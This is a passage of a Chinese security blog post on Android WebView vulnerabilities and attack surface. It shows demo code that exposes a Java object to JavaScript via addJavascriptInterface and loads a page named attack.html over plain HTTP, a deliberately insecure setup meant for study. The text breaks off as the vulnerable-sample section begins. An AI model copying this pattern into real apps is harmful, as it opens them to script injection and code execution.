<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Tr0e"><meta name="copyright" content="Tr0e"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>Android Webview历史高危漏洞与攻击面分析 | Cyber Security</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tr0e.github.io","root":"/","title":["Tr0e","Blog"],"version":"1.10.4","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","fireworks":{"colors":null},"vendors":{"darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Cyber Security" type="application/atom+xml"><meta name="description" content="前言WebView 是 Android 系统中的原生控件，它是一个基于 webkit 引擎、展现 web 页面的控件，相当于增强版的内置浏览器。现在很多 App 里都内置了 Web 网页（Hybrid App），比如说很多电商平台，淘宝、京东、聚划算等等。Webview 的广泛使用也就导致了其成为攻击者关注的对象，本文将学习、讨论下 Webview 远程代码执行漏洞、跨域访问漏洞及其它攻击面。 W">
<meta property="og:type" content="article">
<meta property="og:title" content="Android Webview历史高危漏洞与攻击面分析">
<meta property="og:url" content="https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Cyber Security">
<meta property="og:description" content="前言WebView 是 Android 系统中的原生控件，它是一个基于 webkit 引擎、展现 web 页面的控件，相当于增强版的内置浏览器。现在很多 App 里都内置了 Web 网页（Hybrid App），比如说很多电商平台，淘宝、京东、聚划算等等。Webview 的广泛使用也就导致了其成为攻击者关注的对象，本文将学习、讨论下 Webview 远程代码执行漏洞、跨域访问漏洞及其它攻击面。 W">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e72fbeb497444557927542172f24215b.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/9e182d9c311e4bb1ac057faa9be4ff3a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6f3ecc5426704806ae85a50b6fb9062c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0c58a297dc9a46c597abb4a85df581f5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/bf825bfded2f4c4d8c294603113189e1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b0643c729fe44a3689f51ce615b2a69b.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/cb7434502bcc467991c141628b5da7e8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/481c5e405fef4e93bcf8f9c7036a4cbe.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5162912c892d465e89d81c52a1b30db6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/00a32e1cb3764d98be25a08ad89b91ba.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/c19b060b877747d38624be1e429681ef.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b94aa34959d7436c8582411235f930fb.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/19170e597015448f9c65da3fa0d720e6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2c959444a1d94d54912a2b9a48d82add.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/402977b376224028a0d8d4f4d5e423a8.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8166c181eda54074b222bfe266a69b6c.png">
<meta property="article:published_time" content="2022-06-03T11:52:48.000Z">
<meta property="article:modified_time" content="2022-06-15T16:01:01.093Z">
<meta property="article:author" content="Tr0e">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/e72fbeb497444557927542172f24215b.png"><script>(function() {
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Tr0e"><img width="96" loading="lazy" src="/images/Tr0e.jpg" alt="Tr0e"></a><div class="site-author-name"><a href="/about/">Tr0e</a></div><span class="site-name">Cyber Security</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/about/" title="About Me" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebView%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">WebView基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E7%AE%80Demo%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.1.</span> <span class="toc-text">极简Demo程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JS%E8%B0%83%E7%94%A8Android"><span class="toc-number">2.2.</span> <span class="toc-text">JS调用Android</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BHTML"><span class="toc-number">2.3.</span> <span class="toc-text">加载远程HTML</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">3.</span> <span class="toc-text">接口攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞示例程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.2.</span> <span class="toc-text">本地攻击程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#url%E7%99%BD%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C"><span class="toc-number">3.3.</span> <span class="toc-text">url白名单校验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.</span> <span class="toc-text">JAVA反射机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9EPOC"><span class="toc-number">4.2.</span> <span class="toc-text">历史漏洞POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞修复方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">跨域访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#File-%E5%8D%8F%E8%AE%AE%E9%A3%8E%E9%99%A9"><span class="toc-number">5.1.</span> <span class="toc-text">File 协议风险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E9%A3%8E%E9%99%A9"><span class="toc-number">5.2.</span> <span class="toc-text">通用协议风险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞防御策略</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Tr0e"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Cyber Security"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Android Webview历史高危漏洞与攻击面分析</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2022-06-03 19:52:48" itemprop="dateCreated datePublished" datetime="2022-06-03T19:52:48+08:00">2022-06-03</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">终端安全</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WebView 是 Android 系统中的原生控件，它是一个基于 webkit 引擎、展现 web 页面的控件，相当于增强版的内置浏览器。现在很多 App 里都内置了 Web 网页（Hybrid App），比如说很多电商平台，淘宝、京东、聚划算等等。Webview 的广泛使用也就导致了其成为攻击者关注的对象，本文将学习、讨论下 Webview 远程代码执行漏洞、跨域访问漏洞及其它攻击面。</p>
<h1 id="WebView基础"><a href="#WebView基础" class="headerlink" title="WebView基础"></a>WebView基础</h1><p>WebView 控件功能强大，除了具有一般 View 的属性和设置外，还可以对 url 请求、页面加载、渲染、页面交互进行强大的处理。</p>
<h2 id="极简Demo程序"><a href="#极简Demo程序" class="headerlink" title="极简Demo程序"></a>极简Demo程序</h2><p>在 App 工程 com.bwshen.test 中新建 WebviewTestActivity :</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>页面布局如下：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LinearLayout</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>android</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.android.com/apk/res/android<span class="token punctuation">"</span></span>
    <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>
    <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WebView</span>
        <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@+id/web_view<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LinearLayout</span><span class="token punctuation">></span></span></code></pre>
<p>注意 AndroidMainfest.xml 需要申请访问网络的权限：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.permission.INTERNET<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.permission.ACCESS_NETWORK_STATE<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre>

<p>程序运行效果：</p>
<p><img src="https://img-blog.csdnimg.cn/e72fbeb497444557927542172f24215b.png" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="JS调用Android"><a href="#JS调用Android" class="headerlink" title="JS调用Android"></a>JS调用Android</h2><p>在上面 App 的工程 assets 文件夹下新建 javascript.html：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Carson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
         <span class="token keyword">function</span> <span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span>
            test<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token string">"Tr0e!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
   <span class="token comment">&lt;!--点击按钮则调用callAndroid函数--></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click Me for fun!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>修改 WebviewTestActivity :</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//设置开启JS支持</span>
        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//往WebView中注入了一个Java对象，而这个Java对象的方法可以被js访问</span>
        webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//加载asset文件夹下html</span>
        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"file:///android_asset/javascript.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/**
     * 提供接口在Webview中供JS调用
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AndroidtoJs</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span>
        <span class="token annotation punctuation">@JavascriptInterface</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span>TAG<span class="token punctuation">,</span><span class="token string">"Hello，"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>来看看程序的运行效果：</p>
<p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/9e182d9c311e4bb1ac057faa9be4ff3a.png" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="加载远程HTML"><a href="#加载远程HTML" class="headerlink" title="加载远程HTML"></a>加载远程HTML</h2><p>以上是加载了本地的 html 页面，下面来做个有趣的测试，App 加载远程 html 页面并调用 Android App 提供的接口（即上文 AndroidtoJs 类的 hello 函数）。</p>
<p>首先在本地 PC 临时目录下创建 attack.html（页面内容同上文的 javascripts.html），然后本地起一个简易的 Python HttpServer：<br><img src="https://img-blog.csdnimg.cn/6f3ecc5426704806ae85a50b6fb9062c.png" alt="在这里插入图片描述" loading="lazy"><br>然后简单修改 App 的 WebviewTestActivity，“远程”加载上述 attack.html 页面：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>
webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// webView.loadUrl("file:///android_asset/javascript.html");</span>
webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"http://192.168.0.110:8080/attack.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>运行程序，看看效果：<br><img src="https://img-blog.csdnimg.cn/0c58a297dc9a46c597abb4a85df581f5.png" alt="在这里插入图片描述" loading="lazy"><br>远程 Web Server 也成功收到访问请求：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/bf825bfded2f4c4d8c294603113189e1.png" alt="在这里插入图片描述" loading="lazy"><br>关于 WebView 组件与 JS 之间的其他用法，请参见 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1394361">Android：你要的WebView与 JS 交互方式 都在这里了</a>，本文不再展开。</p>
<h1 id="接口攻击场景"><a href="#接口攻击场景" class="headerlink" title="接口攻击场景"></a>接口攻击场景</h1><p>以上 WebView 组件的使用看着一切正常，接下来来看下 WebView 对外暴露的接口可能存在的风险，以及攻击者可能的攻击手段。</p>
<h2 id="漏洞示例程序"><a href="#漏洞示例程序" class="headerlink" title="漏洞示例程序"></a>漏洞示例程序</h2><p>修改下 com.bwshen.test 应用的 WebviewTestActivity：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
